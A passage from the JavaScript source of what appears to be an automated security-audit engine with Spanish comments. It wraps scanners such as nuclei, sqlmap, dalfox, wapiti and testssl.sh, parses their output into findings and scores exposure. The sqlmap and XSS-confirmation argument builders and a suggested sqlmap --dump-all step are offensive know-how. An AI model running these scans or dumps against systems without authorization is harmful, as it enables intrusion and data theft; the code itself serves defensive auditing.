      remediation: "Ninguna: el GUID de tenant no es secreto. Usar Conditional Access y MFA obligatorio en ese tenant.",
    });
  }

  if (GWS_MX_RE.test(mxText)) {
    out.push({
      title: `${domain} usa Google Workspace (MX Google)`,
      severity: "Info",
      description: `Los MX de ${domain} apuntan a aspmx.l.google.com / googlemail.com: el correo (y habitualmente el IdP) es Google Workspace. Workspace no tiene OIDC por-tenant público; el MX es la correlación pasiva estándar. No se enumeran usuarios.`,
      remediation: "Recomendar 2SV obligatorio, alertas de inicio de sesión y bloqueo de apps menos seguras.",
    });
  } else if (M365_MX_RE.test(mxText) && !nsMatch) {
    out.push({
      title: `${domain} usa Microsoft 365 (MX Outlook)`,
      severity: "Info",
      description: `Los MX de ${domain} apuntan a mail.protection.outlook.com: el correo pasa por Exchange Online aunque getuserrealm no haya confirmado el tenant en esta corrida.`,
      remediation: "Confirmar tenant Entra y aplicar MFA/Conditional Access.",
    });
  }

  if (String(oidcHttpCode || "").trim() === "200") {
    out.push({
      title: `${domain} expone metadata OIDC propia (/.well-known/openid-configuration)`,
      severity: "Info",
      description: `${domain} responde 200 en /.well-known/openid-configuration: aloja su propio Identity Provider (Okta, Auth0, Keycloak u otro OIDC self-hosted) en vez de, o además de, un IdP SaaS externo. Contexto de superficie: revisar issuer, authorization_endpoint y jwks_uri expuestos para banca de ataque de fase 2 (nunca ejecutada aquí).`,
      remediation: "Ninguna: es descubrimiento pasivo. Verificar que el endpoint no filtre configuración interna más allá de lo estándar OIDC.",
    });
  }

  if (samlCode === "200") {
    out.push({
      title: `${domain} expone metadata SAML/ADFS (FederationMetadata.xml)`,
      severity: "Info",
      description: `${domain} sirve FederationMetadata.xml (HTTP 200): hay un STS SAML/ADFS en el apex. Discovery pasivo; no se ha negociado autenticación ni enumerado usuarios.`,
      remediation: "Revisar que el metadata no liste endpoints internos de más; endurecer ADFS (extranet lockout, MFA).",
    });
  }

  return out;
}

const EXPOSURE_DELTA_SKIP_RE = /índice de exposición|nuevo desde última auditoría|no reaparecen/i;
const SEV_EXPOSURE_W = { critical: 1, high: 0.4, medium: 0.1, low: 0.02, info: 0 };

function combineWeights(weights) {
  if (!weights.length) return 0;
  return 1 - weights.reduce((p, w) => p * (1 - Math.max(0, Math.min(1, w))), 1);
}

/**
 * FAIR-lite 0–100 + A–F sobre hallazgos ya recolectados (sin red).
 * E saturado con K=25; T combina señales de secreto vivo / bucket / SSRF;
 * I por peor caso (crítico confirmado vs correo/contexto).
 */
export function computeExposureRisk(findings) {
  const list = (findings || []).filter((f) => f && !EXPOSURE_DELTA_SKIP_RE.test(f.title || ""));
  let S = 0;
  let hasCriticalSecret = false;
  let hasCritical = false;
  const blobOf = (f) => `${f.title || ""} ${f.description || ""}`.toLowerCase();
  for (const f of list) {
    const s = String(f.severity || "").toLowerCase();
    S += SEV_EXPOSURE_W[s] || 0;
    if (s === "critical") hasCritical = true;
    // Solo secretos/cloud/SSRF reales — NO bastar con la palabra
    // «credenciales» (un SQLi «sin credenciales» la contiene y disparaba
    // el suelo E=50 / I=90 como si hubiera un secreto vivo).
    const blob = blobOf(f);
    if (
      s === "critical"
      && /secreto vivo|viva confirmada|hardcodead[ao] en bundle|access key|bucket listable|ssrf confirmado|listable públicamente/i.test(blob)
    ) {
      hasCriticalSecret = true;
    }
  }
  let E = Math.min(1 - Math.exp(-S / 25), 1 - 1e-15);
  if (hasCriticalSecret) E = Math.max(E, 0.5);
  else if (hasCritical) E = Math.max(E, 0.35);
  const threatW = [];
  if (list.some((f) => /viva confirmada|hardcodeada en bundle|access key/i.test(f.title || ""))) threatW.push(0.8);
  if (list.some((f) => /ssrf confirmado|listable públicamente/i.test(f.title || ""))) threatW.push(0.9);
  const T = threatW.length ? combineWeights(threatW) : 0.05;
  const I = (hasCriticalSecret || hasCritical) ? 0.9
    : list.some((f) => /spf|dmarc|tenant|workspace/i.test((f.title || "").toLowerCase())) ? 0.4
      : 0.2;
  const likelihood = combineWeights([E, T]);
  const risk = Math.round(likelihood * I * 1000) / 10;
  const grade = risk >= 80 ? "F" : risk >= 60 ? "D" : risk >= 40 ? "C" : risk >= 20 ? "B" : "A";
  const dominant = E >= T && E >= I ? "exposure" : T >= I ? "breach-likelihood" : "business-impact";
  return {
    risk,
    grade,
    exposure: Math.round(E * 1000) / 10,
    threat: Math.round(T * 1000) / 10,
    impact: Math.round(I * 1000) / 10,
    dominant,
    hasCriticalSecret,
    hasCritical,
  };
}

export function exposureScoreFindings(findings) {
  const score = computeExposureRisk(findings);
  const list = (findings || []).filter((f) => f && !EXPOSURE_DELTA_SKIP_RE.test(f.title || ""));
  const bySev = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  list.forEach((f) => {
    const k = String(f.severity || "info").toLowerCase();
    if (bySev[k] != null) bySev[k] += 1;
    else bySev.info += 1;
  });
  const worst = list
    .filter((f) => /^(critical|high)$/i.test(String(f.severity || "")))
    .map((f) => f.title)
    .filter(Boolean)
    .slice(0, 5);
  const drivers = worst.length
    ? `Hallazgos que más empujan el índice: ${[...new Set(worst)].join("; ")}.`
    : "No hay críticos ni altos: el índice lo marca la higiene (SPF/DMARC/cabeceras) y el recuento de infos.";
  let floorNote = "";
  if (score.hasCriticalSecret) {
    floorNote = " Un crítico de secreto vivo / bucket listable / SSRF eleva el suelo de exposición a 50.";
  } else if (score.hasCritical) {
    floorNote = " Un crítico confirmado eleva el suelo de exposición a 35.";
  }
  return [{
    title: `Índice de exposición OSINT: ${score.risk}/100 (grado ${score.grade})`,
    severity: "Info",
    description: `Cuantificación FAIR-lite sobre los hallazgos de esta auditoría (sin tráfico extra): exposición ${score.exposure}, amenaza ${score.threat}, impacto ${score.impact}. Motor dominante: ${score.dominant}. Recuento que alimenta el índice: ${bySev.critical} críticos, ${bySev.high} altos, ${bySev.medium} medios, ${bySev.low} bajos, ${bySev.info} infos. ${drivers}${floorNote} El grado no es comparable entre clientes.`,
    remediation: "No abras ticket sobre el índice. Cierra primero los hallazgos que alimentan el motor dominante; relanza el análisis para ver si el grado baja. No compares el número entre clientes.",
  }];
}

export function exposureDeltaFindings(currentTitles, previousTitles) {
  const prev = new Set((previousTitles || []).map((t) => String(t).toLowerCase()).filter(Boolean));
  const curr = new Set((currentTitles || []).map((t) => String(t).toLowerCase()).filter(Boolean));
  if (!prev.size) return [];
  const added = [...curr].filter((t) => !prev.has(t) && !EXPOSURE_DELTA_SKIP_RE.test(t));
  const gone = [...prev].filter((t) => !curr.has(t) && !EXPOSURE_DELTA_SKIP_RE.test(t));
  const out = [];
  if (added.length) {
    out.push({
      title: `Nuevo desde última auditoría: ${added.length} hallazgo(s)`,
      severity: "Info",
      description: `Respecto al último engagement del mismo alcance, aparecen ${added.length} título(s) que no estaban: ${added.slice(0, 8).join("; ")}${added.length > 8 ? "…" : ""}. Continuous exposure monitoring: superficie que creció o que el playbook cubre ahora.`,
      remediation: "Revisar cada hallazgo nuevo; no asumir que el resto sigue igual — revalidar los críticos anteriores.",
    });
  }
  if (gone.length) {
    out.push({
      title: `${gone.length} hallazgo(s) de la auditoría anterior no reaparecen`,
      severity: "Info",
      description: `Títulos presentes en el scan anterior y ausentes ahora (posible remediación, o sonda que no corrió): ${gone.slice(0, 8).join("; ")}${gone.length > 8 ? "…" : ""}.`,
      remediation: "Confirmar con el cliente si se remediaron; si no, repetir la sonda concreta.",
    });
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * Nuclei — catálogo curado por stack detectado (no el catálogo completo:
 * eso es ruido). Salida -jsonl: un objeto JSON por línea, cada uno ya trae
 * severity/CVE/nombre propios — no hace falta heurística de confirmación,
 * nuclei solo reporta cuando su template hizo match real contra la
 * respuesta.
 * ------------------------------------------------------------------------ */
const NUCLEI_SEVERITY_MAP = {
  critical: "Critical",
  high: "High",
  medium: "Medium",
  low: "Low",
  info: "Info",
  unknown: "Info",
};

/**
 * Tags de nuclei a correr según el stack detectado por buildPlaybookContext.
 * Siempre incluye "exposure,misconfig,default-login,cve": cada template
 * trae su propio matcher (versión de banner, ruta específica, etc.), así
 * que sumar "cve" no aumenta falsos positivos — solo tiempo de escaneo,
 * por eso el bridge le da timeout largo (EXEC_LONG_TIMEOUT_TOOLS). Suma
 * tags específicos de stack solo si aplican, para no correr miles de
 * templates irrelevantes contra cada target.
 */
export function nucleiTagsForContext(ctx) {
  const tags = ["exposure", "misconfig", "default-login", "cve"];
  if (ctx.isWordpress) tags.push("wordpress", "wp-plugin");
  if (ctx.isApache) tags.push("apache");
  if (ctx.isDvwa) tags.push("php");
  return tags;
}

export function nucleiCurlArgs(baseUrl, tags) {
  return ["-target", baseUrl, "-tags", tags.join(","), "-jsonl", "-silent",
    "-timeout", "10", "-rate-limit", "50"];
}

/**
 * Parsea la salida -jsonl de nuclei (una línea = un match confirmado) a
 * findings del motor. Máximo 10 por corrida: nuclei puede devolver muchos
 * hallazgos de baja severidad (headers informativos) que no aportan más
 * que ruido en el informe si se listan todos sin límite.
 */
export function nucleiFindings(stdout) {
  const lines = String(stdout || "").split("\n").map((l) => l.trim()).filter(Boolean);
  const out = [];
  for (const line of lines) {
    let hit;
    try {
      hit = JSON.parse(line);
    } catch {
      continue;
    }
    const info = hit.info || {};
    const severity = NUCLEI_SEVERITY_MAP[String(info.severity || "").toLowerCase()] || "Info";
    const cveIds = Array.isArray(info.classification?.["cve-id"]) ? info.classification["cve-id"] : [];
    const cveSuffix = cveIds.length ? ` (${cveIds.join(", ")})` : "";
    out.push({
      title: `Nuclei: ${info.name || hit["template-id"] || "hallazgo sin nombre"}${cveSuffix}`,
      severity,
      description: `Template nuclei «${hit["template-id"] || "?"}» confirmó match real contra ${hit["matched-at"] || hit.host || "el target"}. ${info.description || ""}`.trim(),
      remediation: (info.remediation || "Revisar el template y su referencia; aplicar el parche/hardening correspondiente a la CVE o misconfiguración detectada.").trim(),
    });
    if (out.length >= 10) break;
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * SQLMap — descubrimiento de formularios propio de sqlmap (--forms/--crawl)
 * en vez de que el motor intente capturar el formulario a mano: sqlmap ya
 * resuelve eso mejor que un capture genérico. --level=1 --risk=1 son los
 * valores más conservadores (evita payloads pesados/tiempo-based por
 * defecto). Parseo de stdout: sqlmap imprime "Parameter: X (...)" y
 * "Type: ..." por cada punto de inyección confirmado.
 * ------------------------------------------------------------------------ */
export function sqlmapCurlArgs(baseUrl) {
  return ["-u", baseUrl, "--forms", "--crawl=2", "--batch",
    "--level=1", "--risk=1", "--random-agent", "--flush-session"];
}

/**
 * sqlmap sobre parámetros GET reales que arjun ya descubrió (Fase 2), no
 * sobre formularios crawleados a ciegas. Se agrega cada param a la query
 * string con valor dummy "1" (sqlmap necesita el par nombre=valor en la
 * URL para saber qué testear) y -p restringe la prueba exactamente a esos
 * params — evita que sqlmap se ponga a explorar otros que ya haya en la
 * URL sin que arjun los haya confirmado como reales.
 */
export function sqlmapArjunArgs(url, params = []) {
  const qs = params.map((p) => `${encodeURIComponent(p)}=1`).join("&");
  const sep = url.includes("?") ? "&" : "?";
  const targetUrl = qs ? `${url}${sep}${qs}` : url;
  return ["-u", targetUrl, "-p", params.join(","), "--batch",
    "--level=1", "--risk=1", "--random-agent", "--flush-session"];
}

const SQLMAP_PARAM_RE = /Parameter:\s*([^\s(]+)/g;
const SQLMAP_TYPE_RE = /Type:\s*(.+)/g;

/**
 * sqlmap confirma la inyección él mismo (no hace falta heurística extra
 * sobre su output): si imprime "Parameter: X" es porque ya validó el
 * punto de inyección con sus propios tests. Aquí solo se extrae esa
 * confirmación al formato de finding del motor.
 */
export function sqlmapFindings(stdout) {
  const text = String(stdout || "");
  if (!/is vulnerable|sqlmap identified the following injection point/i.test(text)) return [];
  const params = [...text.matchAll(SQLMAP_PARAM_RE)].map((m) => m[1]);
  const types = [...text.matchAll(SQLMAP_TYPE_RE)].map((m) => m[1].trim());
  if (!params.length) {
    // Confirmado pero sin poder extraer el nombre exacto del parámetro:
    // igual se reporta (evidencia real en el propio texto), sin inventar.
    return [{
      title: "Inyección SQL confirmada por sqlmap",
      severity: "Critical",
      description: "sqlmap confirmó al menos un punto de inyección SQL explotable durante el descubrimiento automático de formularios (--forms --crawl).",
      remediation: "Revisar el reporte completo de sqlmap (--dump-all para el detalle); migrar a consultas parametrizadas en el/los formulario(s) afectado(s).",
    }];
  }
  const seen = new Set();
  const out = [];
  params.forEach((param, i) => {
    if (seen.has(param)) return;
    seen.add(param);
    out.push({
      title: `Inyección SQL confirmada por sqlmap en parámetro «${param}»`,
      severity: "Critical",
      description: `sqlmap confirmó explotación real (no solo sospecha) del parámetro «${param}» durante el descubrimiento automático de formularios.${types[i] ? ` Tipo: ${types[i]}.` : ""}`,
      remediation: "Migrar a consultas parametrizadas/prepared statements en el punto exacto; ejecutar sqlmap --dump-all solo con autorización explícita para medir el alcance real de los datos expuestos.",
    });
  });
  return out;
}

/* ------------------------------------------------------------------------ *
 * subfinder + httpx — enumeración pasiva de subdominios y fingerprint HTTP
 * real, en vez de la lista fija de 6 prefijos adivinados (www/mail/vpn/
 * dev/api/staging). subfinder solo consulta fuentes pasivas (CT logs,
 * agregadores DNS) — no toca el target directamente, cero tráfico extra
 * hacia el cliente por esta sonda. httpx sí toca cada subdominio hallado
 * (fingerprint HTTP real), acotado a MAX_HTTPX_HOSTS para no convertir un
 * dominio con cientos de subdominios en un scan sin límite.
 * ------------------------------------------------------------------------ */
const MAX_HTTPX_HOSTS = 8;

export function subfinderArgs(root) {
  return ["-d", root, "-silent", "-timeout", "10"];
}

/** Un hostname por línea en modo -silent; descarta líneas vacías/ruido. */
export function extractSubfinderHosts(stdout, root) {
  const lines = String(stdout || "").split("\n").map((l) => l.trim().toLowerCase()).filter(Boolean);
  const seen = new Set();
  const out = [];
  for (const line of lines) {
    if (!/^[a-z0-9.-]+\.[a-z]{2,}$/.test(line)) continue;
    if (line === root || seen.has(line)) continue;
    seen.add(line);
    out.push(line);
    if (out.length >= MAX_HTTPX_HOSTS) break;
  }
  return out;
}

export function httpxArgsForHosts(hosts) {
  const args = ["-silent", "-json", "-tech-detect", "-status-code", "-title", "-cname", "-timeout", "8"];
  for (const h of hosts) args.push("-u", `https://${h}`);
  return args;
}

/* ------------------------------------------------------------------------ *
 * Subdomain takeover — casi gratis sobre el httpx que ya corre en OSINT
 * (Fase 1): con -cname agregado, cada línea trae el CNAME real. Si apunta
 * a un proveedor conocido de "claim this domain" Y el host no responde
 * sano (failed, sin host_ip, o 404/0), es candidato a takeover. Solo
 * "candidato": confirmar de verdad requiere intentar reclamar el recurso
 * en el proveedor, algo que este motor no automatiza (fuera de alcance
 * de una auditoría no destructiva). Lista curada de proveedores con
 * historial de takeover documentado (evita ruido con dominios propios).
 * ------------------------------------------------------------------------ */
const TAKEOVER_FINGERPRINTS = [
  { suffix: "github.io", service: "GitHub Pages" },
  { suffix: "herokuapp.com", service: "Heroku" },
  { suffix: "herokudns.com", service: "Heroku" },
  { suffix: "s3.amazonaws.com", service: "AWS S3" },
  { suffix: "s3-website", service: "AWS S3" },
  { suffix: "azurewebsites.net", service: "Azure App Service" },
  { suffix: "cloudapp.net", service: "Azure Cloud Service" },
  { suffix: "trafficmanager.net", service: "Azure Traffic Manager" },
  { suffix: "myshopify.com", service: "Shopify" },
  { suffix: "wpengine.com", service: "WP Engine" },
  { suffix: "unbouncepages.com", service: "Unbounce" },
  { suffix: "statuspage.io", service: "Statuspage" },
  { suffix: "surge.sh", service: "Surge.sh" },
  { suffix: "bitbucket.io", service: "Bitbucket Pages" },
  { suffix: "ghost.io", service: "Ghost" },
  { suffix: "helpjuice.com", service: "Helpjuice" },
  { suffix: "helpscoutdocs.com", service: "Help Scout Docs" },
  { suffix: "readme.io", service: "ReadMe" },
  { suffix: "zendesk.com", service: "Zendesk" },
  { suffix: "pantheonsite.io", service: "Pantheon" },
  { suffix: "webflow.io", service: "Webflow" },
  { suffix: "intercom.help", service: "Intercom" },
];

export function subdomainTakeoverFindings(stdout) {
  const lines = String(stdout || "").split("\n").map((l) => l.trim()).filter(Boolean);
  const out = [];
  const seen = new Set();
  for (const line of lines) {
    let hit;
    try {
      hit = JSON.parse(line);
    } catch {
      continue;
    }
    const cnameRaw = Array.isArray(hit.cname) ? hit.cname[0] : hit.cname;
    const cname = String(cnameRaw || "").toLowerCase();
    if (!cname) continue;
    const fp = TAKEOVER_FINGERPRINTS.find((f) => cname.includes(f.suffix));
    if (!fp) continue;
    const dangling = hit.failed === true || !hit.host_ip || hit.status_code === 404 || hit.status_code === 0;
    if (!dangling) continue;
    const host = hit.host || hit.input || hit.url || cname;
    if (seen.has(host)) continue;
    seen.add(host);
    const statusNote = hit.failed ? "la conexión falló (no resuelve/responde)" : `respondió HTTP ${hit.status_code || "sin código"}`;
    out.push({
      title: `Posible subdomain takeover: ${host} → ${fp.service} (CNAME colgante)`,
      severity: "Medium",
      description: `${host} tiene un CNAME hacia ${cname} (${fp.service}), y ${statusNote} — patrón típico de un recurso no reclamado en ese proveedor. Es un candidato, no una confirmación: falta intentar reclamar el mismo nombre en el panel de ${fp.service}.`,
      remediation: `Si ese servicio de ${fp.service} ya no está en uso, eliminar el registro CNAME de ${host} del DNS. Si sigue en uso, verificar que el recurso siga existiendo y reclamado en ${fp.service}; si no, reclamarlo antes de que un tercero lo haga con ese mismo hostname.`,
    });
    if (out.length >= 8) break;
  }
  return out;
}

/**
 * Consolida el fingerprint de todos los subdominios vivos en UN finding
 * Info (inventario de activos, no vulnerabilidad) en vez de uno por
 * subdominio — evita ruido cuando hay varios subdominios activos.
 */
export function httpxFindings(stdout, root) {
  const lines = String(stdout || "").split("\n").map((l) => l.trim()).filter(Boolean);
  const hosts = [];
  for (const line of lines) {
    let hit;
    try {
      hit = JSON.parse(line);
    } catch {
      continue;
    }
    if (!hit.url) continue;
    const tech = Array.isArray(hit.tech) && hit.tech.length ? ` [${hit.tech.slice(0, 4).join(", ")}]` : "";
    hosts.push(`${hit.url} (${hit.status_code || "?"})${hit.title ? ` "${hit.title}"` : ""}${tech}`);
  }
  if (!hosts.length) return [];
  return [{
    title: `${hosts.length} subdominio(s) activo(s) de ${root} descubiertos pasivamente`,
    severity: "Info",
    description: `Enumeración pasiva (subfinder, sin tocar el target) seguida de fingerprint HTTP (httpx) sobre los subdominios hallados: ${hosts.join("; ")}. Contexto de superficie de ataque: confirmar con el cliente si todos pertenecen al alcance autorizado antes de sondear más a fondo cada uno.`,
    remediation: "Ninguna por sí sola: es inventario de activos. Ampliar el alcance formalmente si aparece infraestructura relevante no contemplada, o retirar del DNS público lo que no deba ser accesible.",
  }];
}

/* ------------------------------------------------------------------------ *
 * katana — crawling ACTIVO. form-discovery.js solo parsea HTML ya visitado
 * por casualidad (pasivo); katana sigue links y, con -jc, endpoints en JS.
 * No usamos -hl (headless Chromium experimental): en labs cuelga o supera
 * el timeout del bridge y el motor descartaba el stdout parcial → cero
 * finding y tarjeta fantasma. -ct acota la duración para salir limpio.
 * ------------------------------------------------------------------------ */
const MAX_KATANA_URLS = 30;

export function katanaArgs(baseUrl, depth = "2") {
  return [
    "-u", baseUrl,
    "-d", depth,
    "-jc",
    "-ct", "90",
    "-iqp",
    "-fsu",
    "-silent",
  ];
}

/** Un URL por línea en modo -silent; conserva solo mismo host que baseUrl. */
export function extractKatanaUrls(stdout, baseUrl) {
  let baseHost;
  try {
    baseHost = new URL(baseUrl).host;
  } catch {
    return [];
  }
  const lines = String(stdout || "").split("\n").map((l) => l.trim()).filter(Boolean);
  const seen = new Set();
  const out = [];
  for (const line of lines) {
    let u;
    try {
      u = new URL(line);
    } catch {
      continue;
    }
    if (u.host !== baseHost || seen.has(u.href)) continue;
    seen.add(u.href);
    out.push(u.href);
    if (out.length >= MAX_KATANA_URLS) break;
  }
  return out;
}

/**
 * Inventario consolidado (1 finding Info). Si katana solo devolvió el apex
 * (/), no hay superficie nueva → no emitir ficha.
 */
export function katanaFindings(stdout, baseUrl) {
  const urls = extractKatanaUrls(stdout, baseUrl);
  if (!urls.length) return [];
  let basePath = "/";
  try {
    basePath = (new URL(baseUrl).pathname || "/").replace(/\/+$/, "") || "/";
  } catch {
    /* keep "/" */
  }
  const interesting = urls.filter((href) => {
    try {
      const u = new URL(href);
      const path = (u.pathname || "/").replace(/\/+$/, "") || "/";
      if (path !== basePath) return true;
      return Boolean(u.search || u.hash);
    } catch {
      return true;
    }
  });
  if (!interesting.length) return [];
  return [{
    title: `${interesting.length} endpoint(s) descubiertos por crawling activo (katana)`,
    severity: "Info",
    description: `Crawling activo (katana, links + parseo JS) sobre ${baseUrl} encontró: ${interesting.slice(0, 15).join("; ")}${interesting.length > 15 ? "; ..." : ""}. Inventario de superficie; rutas /api/, /rest/, /admin/ son candidatas a sondas XSS/SQLi/IDOR.`,
    remediation: "Ninguna por sí sola: es inventario de superficie de ataque. Revisar manualmente cada endpoint nuevo — especialmente rutas /api/, /rest/, /admin/ — como candidatos para las sondas de XSS/SQLi/IDOR existentes.",
  }];
}

/* ------------------------------------------------------------------------ *
 * wapiti — scanner de vulnerabilidades web activo (XSS/SQLi/CSRF/exec/
 * traversal/upload/redirect/backup). -v 0 deja stdout limpio de banner y
 * logs de progreso (solo así -o /dev/stdout produce JSON parseable). El
 * JSON tiene 4 secciones: vulnerabilities (hallazgos reales), anomalies
 * (timeouts/errores, poco valor), additionals (info del target, no vulns)
 * y classifications (descripción/solución por categoría). Solo se
 * consumen vulnerabilities + classifications.
 * ------------------------------------------------------------------------ */
const WAPITI_MODULES = "xss,sql,csrf,exec,file,upload,redirect,backup";

// level confirmado por captura real (XSS reflejado real -> level=2 -> Medium
// en la UI de wapiti). Escala estándar de wapitiCore: 1..4.
const WAPITI_LEVEL_SEVERITY = { 1: "Low", 2: "Medium", 3: "High", 4: "Critical" };

export function wapitiArgs(baseUrl, maxScanTime = "150") {
  return [
    "-u", baseUrl,
    "--scope", "folder",
    "-m", WAPITI_MODULES,
    "-f", "json",
    "-o", "/dev/stdout",
    "-v", "0",
    "--max-scan-time", maxScanTime,
  ];
}

export function wapitiFindings(stdout) {
  let report;
  try {
    report = JSON.parse(stdout);
  } catch {
    return [];
  }
  const vulns = report?.vulnerabilities || {};
  const classifications = report?.classifications || {};
  const out = [];
  for (const [category, items] of Object.entries(vulns)) {
    if (!Array.isArray(items) || !items.length) continue;
    const maxLevel = Math.max(...items.map((i) => Number(i.level) || 0));
    const severity = WAPITI_LEVEL_SEVERITY[maxLevel] || "Medium";
    const details = items.slice(0, 5).map((i) =>
      `${i.method || "GET"} ${i.path || "?"}${i.parameter ? ` (parámetro: ${i.parameter})` : ""}: ${i.info || category}`
    ).join("; ");
    out.push({
      title: `${items.length} hallazgo(s) de "${category}" (wapiti)`,
      severity,
      description: `Wapiti confirmó ${items.length} instancia(s) de "${category}": ${details}${items.length > 5 ? "; ..." : ""}.`,
      remediation: classifications[category]?.sol
        || "Revisar la categoría reportada por wapiti y aplicar la corrección correspondiente al tipo de vulnerabilidad.",
    });
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * arjun — descubrimiento de parámetros ocultos (GET). -oJ /dev/stdout con
 * -q deja stdout como JSON puro (sort_keys=True, indent=4, fijo en el
 * propio arjun — no configurable, por eso el parser de línea puede confiar
 * en la indentación). Wordlist small.txt (835 palabras): rapidez en labs,
 * mismo criterio que -ct 90 en katana. Alimenta a dalfox (params reales,
 * no adivinados) en vez de que dalfox dependa de discovery propio (lento,
 * duplicaría trabajo).
 * ------------------------------------------------------------------------ */
const ARJUN_WORDLIST = "/usr/lib/python3/dist-packages/arjun/db/small.txt";

export function arjunArgs(baseUrl, wordlist = ARJUN_WORDLIST) {
  return ["-u", baseUrl, "-m", "GET", "-w", wordlist, "-oJ", "/dev/stdout", "-q", "-T", "10"];
}

/**
 * Extrae {url, params[]} del JSON pretty-printed de arjun aunque esté
 * mezclado en un blob con salida de otros steps (nmap, HTML crawleado,
 * etc.) — por eso NO se hace JSON.parse(stdout) directo, sino un escaneo
 * por línea anclado a la indentación fija de arjun (4/8/12 espacios).
 */
export function extractArjunParams(rawBlob) {
  const lines = String(rawBlob || "").split("\n");
  const results = [];
  let currentUrl = null;
  let currentParams = [];
  let inParams = false;

  const flush = () => {
    if (currentUrl && currentParams.length) results.push({ url: currentUrl, params: currentParams });
  };

  for (const line of lines) {
    const urlMatch = line.match(/^ {4}"(https?:\/\/[^"]+)":\s*\{$/);
    if (urlMatch) {
      flush();
      currentUrl = urlMatch[1];
      currentParams = [];
      inParams = false;
      continue;
    }
    if (currentUrl && /^ {8}"params":\s*\[$/.test(line)) {
      inParams = true;
      continue;
    }
    if (inParams) {
      if (/^ {8}\]/.test(line)) {
        inParams = false;
        continue;
      }
      const paramMatch = line.match(/^ {12}"([^"]*)"/);
      if (paramMatch) currentParams.push(paramMatch[1]);
    }
  }
  flush();
  return results;
}

export function arjunFindings(stdout, baseUrl) {
  const found = extractArjunParams(stdout);
  if (!found.length) return [];
  const list = found.map((f) => `${f.url} [${f.params.join(", ")}]`).join("; ");
  return [{
    title: `${found.reduce((n, f) => n + f.params.length, 0)} parámetro(s) oculto(s) descubiertos (arjun)`,
    severity: "Info",
    description: `Fuzzing de nombres de parámetros GET sobre ${baseUrl} (arjun) reveló: ${list}. Superficie de ataque para XSS/SQLi/IDOR no visible en el HTML/JS ya crawleado.`,
    remediation: "Ninguna por sí sola: es inventario de superficie. Auditar manualmente cada parámetro descubierto — especialmente si controla lógica de negocio o consultas — con las sondas de XSS/SQLi/IDOR existentes.",
  }];
}

/* ------------------------------------------------------------------------ *
 * dalfox — confirmación activa de XSS sobre parámetros ya conocidos
 * (típicamente los que descubre arjun). --skip-bav evita ruido de checks
 * "basic another vulnerability" fuera de alcance de XSS. -S + --format
 * jsonl -> stdout es JSONL puro, un hallazgo confirmado/reflejado por
 * línea, sin logs de progreso mezclados.
 * ------------------------------------------------------------------------ */
export function dalfoxArgs(url, params = []) {
  const args = ["url", url, "--skip-bav", "-S", "--format", "jsonl", "--no-color", "--no-spinner"];
  for (const p of params) args.push("-p", p);
  return args;
}

export function dalfoxFindings(stdout, baseUrl) {
  const lines = String(stdout || "").split("\n").map((l) => l.trim()).filter(Boolean);
  const out = [];
  for (const line of lines) {
    if (!line.startsWith("{")) continue;
    let hit;
    try {
      hit = JSON.parse(line);
    } catch {
      continue;
    }
    if (!hit.param) continue;
    const verified = hit.type === "V";
    out.push({
      title: `XSS ${verified ? "confirmado" : "reflejado"} en parámetro "${hit.param}" (dalfox)`,
      severity: hit.severity || (verified ? "High" : "Medium"),
      description: `Dalfox ${verified ? "disparó y verificó" : "reflejó"} un payload XSS en el parámetro "${hit.param}" de ${baseUrl}. PoC: ${hit.data || "N/D"}. Payload: ${hit.payload || "N/D"}.`,
      remediation: "Escapar/codificar (output encoding) el valor del parámetro según el contexto de salida (HTML, atributo, JS) antes de reflejarlo en la respuesta. Aplicar CSP como defensa en profundidad.",
    });
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * testssl.sh — hueco total previo: cero verificación de TLS/cipher/cert.
 * Se parsea el output de texto plano (por defecto, sin --json*): cada
 * check imprime una línea "<nombre>  <resultado>", formato estable entre
 * versiones de la herramienta. No se intenta usar --jsonfile-pretty
 * /dev/stdout: eso intercala el JSON con el texto normal en el mismo
 * stream y produce salida no parseable de forma fiable.
 * ------------------------------------------------------------------------ */
export function testsslArgs(host, port = "443") {
  return ["--fast", "--color", "0", "-p", "-U", `${host}:${port}`];
}

const DEPRECATED_PROTOCOLS = ["SSLv2", "SSLv3", "TLS 1", "TLS 1.1"];

/** Protocolos obsoletos que la línea marca como "offered" (no "not offered"). */
export function testsslDeprecatedProtocols(stdout) {
  const text = String(stdout || "");
  const found = [];
  for (const proto of DEPRECATED_PROTOCOLS) {
    const re = new RegExp(`^\\s*${proto.replace(".", "\\.")}\\s+offered\\b`, "m");
    if (re.test(text)) found.push(proto);
  }
  return found;
}

/**
 * testssl marca una vulnerabilidad real con "VULNERABLE (NOT ok)" — texto
 * exacto y estable de la herramienta, distinto de "not vulnerable (OK)".
 * Filtrar por ese literal evita falsos positivos por la palabra
 * "vulnerable" apareciendo también en el caso negativo.
 */
export function testsslVulnerabilities(stdout) {
  const text = String(stdout || "");
  const out = [];
  for (const line of text.split("\n")) {
    if (!/VULNERABLE \(NOT ok\)/i.test(line)) continue;
    const name = line.split(/VULNERABLE \(NOT ok\)/i)[0].trim();
    if (name) out.push(name);
  }
  return out;
}

export function testsslFindings(stdout, host) {
  const out = [];
  const vulns = testsslVulnerabilities(stdout);
  vulns.forEach((name) => {
    out.push({
      title: `${host || "El target"} vulnerable a ${name} (testssl.sh)`,
      severity: "Critical",
      description: `testssl.sh confirmó la vulnerabilidad "${name}" contra el servicio TLS de ${host || "el target"} (evidencia: "VULNERABLE (NOT ok)" en el output de la herramienta, no una sospecha por versión).`,
      remediation: "Parchear la librería TLS del servidor (OpenSSL/similar) o deshabilitar la configuración específica que la herramienta identifica; volver a correr testssl.sh tras el cambio para confirmar cierre.",
    });
  });
  const deprecated = testsslDeprecatedProtocols(stdout);
  if (deprecated.length) {
    const critical = deprecated.some((p) => p.startsWith("SSL"));
    out.push({
      title: `Protocolo(s) TLS/SSL obsoleto(s) habilitado(s): ${deprecated.join(", ")}`,
      severity: critical ? "Critical" : "Medium",
      description: `El servicio TLS de ${host || "el target"} sigue aceptando ${deprecated.join(", ")}. ${deprecated.some((p) => p.startsWith("SSL")) ? "SSLv2/SSLv3 tienen fallos criptográficos conocidos sin mitigación (no es cuestión de configurarlos mejor, hay que deshabilitarlos)." : "TLS 1.0/1.1 están deprecados (PCI-DSS los prohíbe desde 2018) aunque no tengan un exploit trivial por sí solos."}`,
